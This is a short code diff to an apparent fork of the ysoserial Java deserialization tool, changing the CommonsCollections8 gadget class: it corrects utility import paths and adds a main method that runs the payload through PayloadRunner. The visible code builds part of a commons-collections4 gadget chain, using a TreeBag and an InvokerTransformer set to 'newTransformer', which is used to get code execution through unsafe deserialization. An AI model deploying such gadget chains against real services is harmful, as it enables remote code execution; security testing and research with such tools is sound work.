@@ -2,6 +2,7 @@ package A.R.ysogate.payloads.gadgets;
 
 import java.util.Comparator;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
@@ -9,8 +10,8 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({"navalorenzo"})
@@ -24,5 +25,9 @@ public class CommonsCollections8 implements ObjectPayload<TreeBag> {
 		tree.add(templates);
 		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 		return tree;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections8.class, args);
 	}
 }
